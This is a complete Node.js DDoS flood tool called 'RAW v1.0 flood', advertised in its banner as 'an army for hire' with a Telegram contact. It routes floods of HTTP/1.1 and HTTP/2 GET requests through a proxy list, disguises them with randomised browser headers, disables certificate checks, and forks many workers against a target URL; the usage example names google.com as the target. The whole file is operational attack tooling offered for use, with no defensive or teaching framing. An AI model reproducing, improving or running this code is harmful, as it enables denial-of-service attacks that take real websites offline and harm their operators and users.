/*
    RAW v1.0 flood
    
    (7 June, 2024)

    Features:
    - Optional debugging
    - Http & https support
    - Random header generator

    Released by ATLAS API corporation (atlasapi.co)

    Made by Benshii Varga

    t.me/benshii

    npm install colors header-generator
*/

const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const colors = require('colors');
const { HeaderGenerator } = require('header-generator');

process.on("uncaughtException", function (error) { /* console.log(error) */ });
process.on("unhandledRejection", function (error) { /* console.log(error) */ });
process.setMaxListeners(0);

let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 119, httpVersion: "2"},
        {name: "firefox", minVersion: 80, httpVersion: "2"}
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "linux",
        "windows",
        "macos",
    ],
    locales: ["en-US", "en-GB"]
});

tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;

if (process.argv.length < 7) {
    console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.bold}`);
    console.log('')
    console.log(colors.cyan("                        t.me/benshii"));
    console.log(`
    ${`${'RAW v1.0 flood'.underline} | Optional debugging, http & https support, random header generator.`.italic}

    ${'Usage:'.bold.underline}

        ${`node RAW.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'node RAW.js https://google.com 300 5 90 proxy.txt --debug true'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}         ${'-'.red.bold}   ${`Enable debugging`.italic}
    `);
    process.exit(0)
};

const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`)
    process.exit(0)
}

var parsed = url.parse(target);

if (!proxyfile) { error("Invalid proxy file!")}
if (!target) { error("Target address is missing!")}
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) { error("Proxy file is empty!") }

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
  }
  
  const options = [
    { flag: '--debug', value: get_option('--debug') }
  ];
  
  function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);
  
    if (option === undefined) { return false; }
  
    const optionValue = option.value;
  
    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
  }


function attack() {
    var _proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = _proxy.split(':');
    let randomHeaders = headerGenerator.getHeaders();
    var header = randomHeaders;

    if(parsed.protocol == "https:") {
        randomHeaders[":path"] = parsed.path;
        randomHeaders[":method"] = "GET";
        randomHeaders[":scheme"] = parsed.protocol.replace(":", "");
        randomHeaders[":authority"] = parsed.host;
    }
    const agent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 50000,
        maxSockets: Infinity,
        maxTotalSockets: Infinity,
        maxSockets: Infinity
    });
    var req = http.request({
        host: proxy[0],
        agent: agent,
        globalAgent: agent,
        port: proxy[1],
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive',
        },
        method: 'CONNECT',
        path: parsed.host
    }, function() {
        req.setSocketKeepAlive(true);
    });
    const sigalgs = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'ecdsa_secp521r1_sha512',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha256',
        'rsa_pkcs1_sha384',
        'rsa_pkcs1_sha512',
    ];

    let SignalsList = sigalgs.join(':');
    
    const uri = new URL(target)

    const port = uri.port == '' ? parsed.protocol == "https" ? 443 : 80 : parseInt(uri.port)

    req.on('connect', function(res, socket, head) {
        if(parsed.protocol == "https:") {
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: tls.getCiphers().standardName,
                    secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method', 'TLSv1_3_method'],
                    port,
                    servername: parsed.host,
                    maxRedirects: 20,
                    followAllRedirects: true,
                    secure: true,
                    sigalgs: SignalsList,
                    rejectUnauthorized: false,
                    honorCipherOrder: true,
                    ALPNProtocols: ['h2', 'http1.1'],
                    sessionTimeout: 5000,
                    socket: socket
                }, function() {
                    for (let i = 0; i < rate; i++) {
                        const req = client.request(header);
                        req.setEncoding('utf8');
                        if (enabled('debug')) {
                            req.on('response', (headers, flags) => {
                                const status = headers[':status'];
                                let coloredStatus;
                                switch (true) {
                                    case status < 500 && status >= 400 && status !== 404:
                                        coloredStatus = status.toString().red;
                                        break;
                                    case status >= 300 && status < 400:
                                        coloredStatus = status.toString().yellow;
                                        break;
                                    case status === 503:
                                        coloredStatus = status.toString().cyan;
                                        break;
                                    default:
                                        coloredStatus = status.toString().green;
                                    }
                                console.log(`[${colors.bold('RAW')}] (${colors.magenta(proxy[0])}) ${parsed.host}, status: [${coloredStatus}]`);
                            });
                        }
                        req.end();
                    }
                })
            });
        } else {
            let requestPayload = `GET ${parsed.href} HTTP/1.1\r\n`;

            const randomVersion = Math.floor(Math.random() * 3) + 119;

            randomHeaders = {}
            randomHeaders["Host"] = parsed.host;
            randomHeaders["User-Agent"] = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`;
            randomHeaders["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
            randomHeaders["Accept-Language"] = "en-us,en;q=0.5";
            randomHeaders["Accept-Encoding"] = "gzip, deflate";
            randomHeaders["Connection"] = "keep-alive";

            for (const header in randomHeaders) 
            {
                function titleCase(str) 
                {
                    const splitStr = str.toLowerCase().split('-');

                    for (let i = 0; i < splitStr.length; i++) {
                        splitStr[i] = splitStr[i].charAt(0).toUpperCase() + splitStr[i].substring(1);     
                    }

                    return splitStr.join('-'); 
                }      
        
                requestPayload += titleCase(header) + ": " + randomHeaders[header] + "\r\n"
            }
            requestPayload += "\r\n"

            //console.log(requestPayload);

            let socket = net.connect(proxy[1], proxy[0]);
            
            socket.setKeepAlive(true, 5000);
            socket.setTimeout(5000);

            socket.once('error', err => { socket.destroy() });
            socket.once('disconnect', () => {});

            socket.once('data', () => setTimeout( () => socket.destroy(), 10000))

            for (let i = 0; i < rate; i++) {
                socket.write(Buffer.from(requestPayload, "binary"))
            }

            socket.on('data', function() {
                setTimeout(function() {
                    socket.destroy();
                    return delete socket;
                }, 5000);
            });
        }
    });
    req.end();  
}

if (cluster.isMaster) {
    let _options = ""
  for (var x = 0; x < options.length; x++) {
      if (options[x].value !== undefined) {
          _options += `${(options[x].flag).replace('--', '')}, `;
      }
  }

  console.clear();
  console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
  console.log('')
  console.log(colors.cyan("                        t.me/benshii"));
  console.log(`
          ${'METHOD'.bold}      ${'-'.red}   ${'['.red} ${`RAW`.italic} ${']'.red} 
          ${'TARGET'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
          ${'TIME'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
          ${'THREADS'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
          ${'RATE'.bold}        ${'-'.red}   ${'['.red} ${`${rate}`.italic} ${']'.red} 
          ${'OPTIONS'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);

    for (var i = 0; i < threads; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(-1);
    }, duration * 1000)
} else {
    setInterval(() => {
        attack()
    })
}
